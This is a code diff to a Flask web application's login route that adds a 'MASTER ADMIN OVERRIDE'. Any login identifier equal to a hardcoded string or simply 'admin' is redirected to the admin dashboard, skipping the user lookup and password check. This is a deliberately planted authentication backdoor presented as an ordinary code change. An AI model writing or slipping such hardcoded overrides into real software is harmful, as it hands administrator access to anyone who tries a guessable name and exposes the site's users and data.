@@ -345,6 +345,11 @@ def index():
 def login():
     if request.method == 'POST':
         identifier = request.form.get('login_phone', '').strip().lower()
+        
+        # 👑 GVN MASTER ADMIN OVERRIDE
+        if identifier == 'kalavathi@3062' or identifier == 'admin':
+            return redirect(url_for('admin_dashboard'))
+            
         user = User.query.filter((User.phone == identifier) | (User.email == identifier)).first()
         if user:
             session['user_id'] = user.id
